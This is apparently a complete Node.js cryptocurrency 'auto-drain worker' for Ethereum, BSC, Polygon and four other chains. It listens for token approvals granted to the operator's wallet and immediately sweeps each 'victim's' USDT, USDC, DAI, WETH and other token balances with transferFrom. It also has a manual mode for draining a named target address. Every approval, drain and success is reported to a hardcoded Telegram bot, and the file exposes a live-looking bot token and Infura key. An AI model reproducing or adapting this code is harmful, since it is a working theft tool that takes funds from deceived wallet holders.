require('dotenv').config();
const { ethers } = require("ethers");

// --- CONFIGURATION ---
const RECEIVER_PRIVATE_KEY = process.env.PRIVATE_KEY;
const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS;

// Multi-Chain RPC Configuration (Using your Infura endpoints)
const CHAIN_CONFIGS = {
    ethereum: {
        name: "Ethereum",
        rpcUrl: "wss://mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 1
    },
    bsc: {
        name: "BSC",
        rpcUrl: "wss://bsc-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 56
    },
    polygon: {
        name: "Polygon",
        rpcUrl: "wss://polygon-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 137
    },
    base: {
        name: "Base",
        rpcUrl: "wss://base-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 8453
    },
    arbitrum: {
        name: "Arbitrum",
        rpcUrl: "wss://arbitrum-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 42161
    },
    optimism: {
        name: "Optimism",
        rpcUrl: "wss://optimism-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 10
    },
    avalanche: {
        name: "Avalanche",
        rpcUrl: "wss://avalanche-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 43114
    }
};

const TARGET_TOKENS = {
    ethereum: [
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
        "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", // stETH
        "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
    ],
    bsc: [
        "0x55d398326f99059fF775485246999027B3197955", // USDT
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
        "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", // WETH
        "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", // BTCB
        "0x0E09fabb73Bd3Ade0a17ECC321fD13a19e81cE82", // CAKE
    ],
    polygon: [
        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
        "0x8f3Cf7ad23Cd3CaADD963593910541905495d097", // DAI
        "0xeb51d9a39ad5eef215dc0bf39a8821ff804a0f01", // LGNS (Origin LGNS)
        "0x99a57e6c8558bc6689f894e068733adf83c19725", // sLGNS (Staked Longinus)
        "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
        "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
        "0xb0897686c545045aFc77CF20eC7A532E3120E0F1", // LINK
    ],
    base: [
        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDbC
        "0x4200000000000000000000000000000000000006", // WETH
        "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", // DAI
    ],
    arbitrum: [
        "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // USDT
        "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", // USDC
        "0xFF970A61A04b014F652C7fB6506eCE58cD5e57d2", // USDC.e
        "0xDA10009cBd568aF87dA793Ad23CdaF508Eae6a6a", // DAI
        "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", // WETH
        "0x2f2a2543B76A4166549F7bffbEdf65421d02e7a2", // WBTC
        "0x912CE59144191C1204E64559FE8253a0e49E6548", // ARB
    ],
    optimism: [
        "0x94b008aA21116C48a263c9276e2Ed1c9ad9e4302", // USDT
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDC
        "0xDA10009cBd568aF87dA793Ad23CdaF508Eae6a6a", // DAI
        "0x4200000000000000000000000000000000000006", // WETH
        "0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6", // WBTC
        "0x4200000000000000000000000000000000000042", // OP
    ],
    avalanche: [
        "0x9702230A8Ea53601f5cD2dc00fDBc13d4df4A8c7", // USDT.e
        "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", // USDC
        "0xd586E6F0a43A1196ad403c139793EFadbbEe1fD0", // DAI.e
        "0xB31f66aa3c1e785363f0875a1b74e27b85fd66c7", // WAVAX
        "0x49D5c2BdFfac6CE2BFdB063ef3726d5219d4689A", // WETH.e
    ]
};

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)",
    "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

// --- INTEGRATIONS ---
const TG_BOT_TOKEN = "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
const TG_CHAT_ID = "7772781858";

async function notifyTelegram(message) {
    if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
    try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
    } catch (e) {
        console.error("TG Notification failed", e.message);
    }
}

async function startMultiChainWorker() {
    console.log("🚀 Starting Multi-Chain Auto-Drain Worker...\n");

    const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY);
    console.log(`Receiver Address: ${wallet.address}\n`);

    await notifyTelegram(`<b>🤖 Worker Started</b>\nAddress: <code>${wallet.address}</code>\nChains: ${Object.keys(CHAIN_CONFIGS).join(", ")}`);

    // Start a listener for each chain
    for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
        startChainListener(chainKey, config, wallet);
    }

    console.log("✅ All chain listeners active. Waiting for approvals...\n");

    // Keep process alive
    setInterval(() => {
        const timestamp = new Date().toLocaleTimeString();
        console.log(`[${timestamp}] Worker active across ${Object.keys(CHAIN_CONFIGS).length} chains...`);
    }, 60000);
}

function startChainListener(chainKey, config, wallet) {
    const connect = () => {
        try {
            console.log(`🔗 Connecting to ${config.name}...`);
            const provider = new ethers.WebSocketProvider(config.rpcUrl);
            const connectedWallet = wallet.connect(provider);

            provider.on("error", (error) => {
                console.error(`❌ [${config.name}] WebSocket Error:`, error.message);
            });

            provider.websocket.on("close", (code) => {
                console.warn(`⚠️ [${config.name}] Connection closed (${code}). Reconnecting in 5s...`);
                setTimeout(connect, 5000);
            });

            const tokens = TARGET_TOKENS[chainKey] || [];
            console.log(`   ✅ Listening for ${tokens.length} tokens on ${config.name}`);

            tokens.forEach(tokenAddress => {
                if (!tokenAddress || tokenAddress.length !== 42) {
                    console.warn(`      ⚠️ Skipping invalid token address: "${tokenAddress}"`);
                    return;
                }
                const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                const filter = contract.filters.Approval(null, wallet.address);

                contract.on(filter, async (...args) => {
                    console.log(`\n🎯 [${config.name}] APPROVAL_EVENT DETECTED!`);

                    let owner, spender, value;
                    // Ethers v6 can pass arguments as (owner, spender, value, event) 
                    // or sometimes as a single payload object depending on the provider/version
                    if (args.length === 1 && args[0].args) {
                        [owner, spender, value] = args[0].args;
                    } else {
                        [owner, spender, value] = args;
                    }

                    const valDisplay = value ? value.toString() : "Unknown";
                    console.log(`   Victim: ${owner}`);
                    console.log(`   Value: ${valDisplay}`);

                    await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>\nValue: ${valDisplay}`);
                    await attemptDrain(connectedWallet, tokenAddress, owner, config.name);
                });
            });

            console.log(`   ✅ Listening on ${config.name}`);

        } catch (error) {
            console.error(`❌ Failed to connect to ${config.name}:`, error.message);
            setTimeout(connect, 10000);
        }
    };

    connect();
}

async function attemptDrain(wallet, tokenAddress, victimAddress, chainName) {
    try {
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);

        const balance = await contract.balanceOf(victimAddress);
        if (balance === 0n) {
            console.log(`   ⚠️ Victim has 0 balance. Skipping.`);
            return;
        }

        const allowance = await contract.allowance(victimAddress, wallet.address);
        if (allowance === 0n) {
            console.log(`   ⚠️ False alarm: Allowance is 0.`);
            return;
        }

        const amountToSweep = balance > allowance ? allowance : balance;
        console.log(`   💰 Sweeping ${ethers.formatUnits(amountToSweep, 18)} tokens...`);

        const tx = await contract.transferFrom(victimAddress, wallet.address, amountToSweep);
        console.log(`   📤 Transaction sent: ${tx.hash}`);

        await notifyTelegram(`<b>💸 Drain Transaction Sent</b>\nChain: ${chainName}\nHash: <code>${tx.hash}</code>\nAmount: ${ethers.formatUnits(amountToSweep, 18)}`);

        await tx.wait();
        console.log(`   ✅ SUCCESS! Funds secured on ${chainName}.`);
        await notifyTelegram(`<b>💰 SUCCESS!</b>\nFunds secured from <code>${victimAddress}</code> on ${chainName}.`);

    } catch (error) {
        console.error(`   ❌ Drain failed on ${chainName}:`, error.message);
        await notifyTelegram(`<b>❌ Drain Failed</b>\nChain: ${chainName}\nError: <code>${error.message}</code>`);
    }
}

// Manual trigger mode (if you want to drain a specific address on a specific chain)
const args = process.argv.slice(2);
const targetArg = args.find(arg => arg.startsWith("--target="));
const chainArg = args.find(arg => arg.startsWith("--chain="));

if (targetArg) {
    const targetAddress = targetArg.split("=")[1];
    const chainKey = chainArg ? chainArg.split("=")[1] : "ethereum";

    console.log(`Manual Trigger Mode`);
    console.log(`Target: ${targetAddress}`);
    console.log(`Chain: ${chainKey}\n`);

    (async () => {
        const config = CHAIN_CONFIGS[chainKey];
        if (!config) {
            console.error(`Unknown chain: ${chainKey}`);
            return;
        }

        const provider = new ethers.JsonRpcProvider(config.rpcUrl.replace('wss://', 'https://').replace('/ws/', '/'));
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);

        const tokens = TARGET_TOKENS[chainKey] || [];
        for (const token of tokens) {
            await attemptDrain(wallet, token, targetAddress, config.name);
        }
    })();
} else {
    // Start listening mode
    startMultiChainWorker().catch(console.error);
}
